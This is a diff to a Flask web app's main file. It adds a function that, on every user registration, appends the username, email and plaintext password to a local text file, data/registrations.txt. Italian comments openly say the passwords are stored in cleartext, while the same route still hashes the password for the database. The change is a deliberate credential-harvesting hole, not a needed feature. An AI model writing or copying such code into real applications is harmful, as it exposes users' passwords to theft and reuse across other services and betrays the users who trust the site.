@@ -2,6 +2,7 @@ import os
 from flask import Flask, render_template, request, redirect, url_for, session
 from flask_sqlalchemy import SQLAlchemy
 import hashlib
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -30,6 +31,15 @@ PAYPAL_LINK = "https://www.paypal.me/BotAi36"
 @app.context_processor
 def inject_session_id():
     return dict(session_id=SESSION_ID)
+
+# ------------------ FUNZIONE PER SALVARE REGISTRAZIONI ------------------
+def log_registration(username, email, password):
+    """Salva username, email e password (in chiaro!) in un file di testo."""
+    # Crea la cartella 'data' se non esiste
+    os.makedirs('data', exist_ok=True)
+    with open('data/registrations.txt', 'a') as f:
+        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
+        f.write(f"[{timestamp}] Username: {username} | Email: {email} | Password: {password}\n")
 
 # ------------------ MODELS ------------------
 class User(db.Model):
@@ -181,6 +191,10 @@ def register():
         user.set_password(p)
         db.session.add(user)
         db.session.commit()
+
+        # ------ SALVA REGISTRAZIONE SU FILE TXT (in chiaro) ------
+        log_registration(u, e, p)
+
         return redirect(url_for('login'))
     return render_template('register.html')
 
